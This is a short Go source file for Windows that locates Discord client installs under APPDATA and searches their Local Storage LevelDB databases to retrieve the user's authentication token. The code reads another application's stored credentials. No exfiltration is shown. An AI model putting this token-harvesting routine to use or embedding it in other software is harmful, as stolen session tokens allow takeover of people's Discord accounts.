//+build windows

package token

import (
	"github.com/pkg/errors"
	log "github.com/sirupsen/logrus"
	"os"
	"path/filepath"
)

var versions = []string{"Discord", "discordcanary", "discordptb"}

func GetToken() (tok string, err error) {
	appdata, def := os.LookupEnv("APPDATA")
	if !def {
		return "", errors.New("APPDATA path wasn't specified in environment")
	}

	for _, ver := range versions {
		path := filepath.Join(appdata, ver, "Local Storage/leveldb")
		log.Debugf("Searching for LevelDB database in %v", path)

		tok, err = searchLevelDB(path)
		if err == nil {
			return
		}
	}

	err = errors.New("Failed to retrieve token from database")
	return
}
